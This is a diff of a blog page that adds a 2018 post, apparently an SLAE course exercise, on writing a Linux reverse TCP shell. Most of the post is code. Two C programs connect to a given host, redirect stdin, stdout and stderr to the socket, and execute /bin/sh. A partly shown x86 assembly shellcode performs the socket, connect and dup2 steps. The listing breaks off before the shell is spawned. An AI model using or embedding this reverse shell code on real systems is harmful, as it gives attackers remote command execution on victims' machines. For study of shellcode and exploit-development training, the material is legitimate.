@@ -9,7 +9,7 @@
   <meta name="author" content="tcunha">
 
   
-  <meta name="description" content="In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to socketcall(2) &hellip;">
+  <meta name="description" content="Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,578 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2018-05-21T20:39:57+00:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2018</span></span> <span class='time'>8:39 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
+
+<figure class='code'><figcaption><span>connect(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just like <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a>, the second argument has to be manually packed with the IP address and port to connect to:</p>
+
+<figure class='code'><figcaption><span>retrieving the system call number and constants</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall connect
+</span><span class='line'><span class="c">#define __NR_connect 362</span>
+</span><span class='line'>0x16a
+</span><span class='line'><span class="nv">$ </span>python -c <span class="s1">&#39;import socket; print socket.AF_INET&#39;</span>
+</span><span class='line'>2
+</span></code></pre></td></tr></table></div></figure>
+
+
+<pre><code>+----------+--------------------+
+| register |       value        |
++----------+--------------------+
+| eax      | 362                |      +---------------------------------+ H
+| ebx      | socket(2) fd       |      | IP address (network byte order) |
+| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order)       |
+| edx      | 16                 |      | AF_INET (2)                     |
++----------+--------------------+      +---------------------------------+ L
+</code></pre>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;limits.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;strings.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">exec_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+</span><span class='line'>  <span class="kt">char</span>                    <span class="o">*</span><span class="n">endptr</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span>                      <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">long</span>                     <span class="n">port</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span>       <span class="n">sa</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;usage: host port&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">port</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">endptr</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;not a number&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">ERANGE</span> <span class="o">||</span> <span class="p">(</span><span class="n">port</span> <span class="o">&lt;=</span> <span class="mi">1024</span> <span class="o">||</span> <span class="n">port</span> <span class="o">&gt;=</span> <span class="mi">65536</span><span class="p">))</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;port out of range&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;socket&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sa</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">port</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sa</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;connect&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="n">exec_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">exec_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;execve&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* NOTREACHED */</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, one should just use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> instead. This has the advantage of also being protocol agnostic:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netdb.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">reverse_try</span><span class="p">(</span><span class="k">struct</span> <span class="n">addrinfo</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">warn</span><span class="p">(</span><span class="s">&quot;socket&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">warn</span><span class="p">(</span><span class="s">&quot;connect&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span>            <span class="o">*</span><span class="n">exec_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+</span><span class='line'>  <span class="kt">int</span>              <span class="n">ai_ret</span><span class="p">,</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">addrinfo</span>  <span class="n">ai_hints</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">addrinfo</span> <span class="o">*</span><span class="n">ai_ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">ai_srv</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;usage: host port&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ai_hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">ai_hints</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">ai_hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">ai_ret</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">ai_hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ai_srv</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;getaddrinfo: %s&quot;</span><span class="p">,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">ai_ret</span><span class="p">));</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">ai_ptr</span> <span class="o">=</span> <span class="n">ai_srv</span><span class="p">;</span> <span class="n">ai_ptr</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">ai_ptr</span> <span class="o">=</span> <span class="n">ai_ptr</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">reverse_try</span><span class="p">(</span><span class="n">ai_ptr</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ai_ptr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;failed to connect&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">ai_srv</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;dup2&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="n">exec_args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">exec_args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;execve&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>    <span class="cm">/* NOTREACHED */</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As for the commented shellcode:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">set</span> <span class="no">edx</span> <span class="no">to</span> <span class="no">zero</span> <span class="no">as</span> <span class="no">well</span><span class="p">,</span> <span class="no">by</span> <span class="no">sign</span> <span class="no">extending</span> <span class="no">eax</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x167</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">socket</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x2</span>                <span class="err">;</span> <span class="no">PF_INET</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ebx</span>                 <span class="err">;</span> <span class="no">domain</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x1</span>                <span class="err">;</span> <span class="no">SOCK_STREAM</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">type</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="p">(</span><span class="no">protocol</span><span class="p">)</span> <span class="no">initialized</span> <span class="no">to</span> <span class="no">zero</span> <span class="no">by</span> <span class="no">the</span> <span class="no">cdq</span> <span class="no">instruction</span> <span class="no">above</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">xchg</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>           <span class="err">;</span> <span class="no">fd</span> <span class="no">on</span> <span class="no">ebx</span> <span class="no">from</span> <span class="no">this</span> <span class="no">point</span> <span class="no">below</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x16a</span>           <span class="err">;</span> <span class="no">use</span> <span class="no">mov</span> <span class="no">instead</span> <span class="no">of</span> <span class="no">push</span> <span class="no">imm16</span> <span class="no">and</span> <span class="no">pop</span> <span class="no">r16</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">connect</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">struct</span> <span class="no">sockaddr</span> <span class="p">*,</span> <span class="no">socklen_t</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">HOST</span>               <span class="err">;</span> <span class="no">host</span> <span class="no">in</span> <span class="no">network</span> <span class="no">byte</span> <span class="no">order</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">word</span> <span class="no">PORT</span>          <span class="err">;</span> <span class="no">port</span> <span class="no">in</span> <span class="no">network</span> <span class="no">byte</span> <span class="no">order</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">word</span> <span class="mi">0x2</span>           <span class="err">;</span> <span class="no">AF_INET</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">addr</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x10</span>               <span class="err">;</span> <span class="mi">16</span> <span class="no">bytes</span> <span class="no">in</span> <span class="no">total</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">edx</span>                 <span class="err">;</span> <span class="no">addrlen</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x2</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">newfd</span>
+</span><span class='line'><span class="nl">bind_dup2_loop:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x3f</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">dup2</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span> 
+</span><span class='line'>  <span class="no">int</span> <span class="mi">0x80</span>
+</span><span class='line'>  <span class="nf">dec</span> <span class="no">ecx</span>
+</span><span class='line'>  <span class="nf">jns</span> <span class="no">bind_dup2_loop</span>      <span class="err">;</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">jump</span> <span class="no">if</span> <span class="no">ecx</span> <span class="no">is</span> <span class="no">positive</span>
+</span><span class='line'>
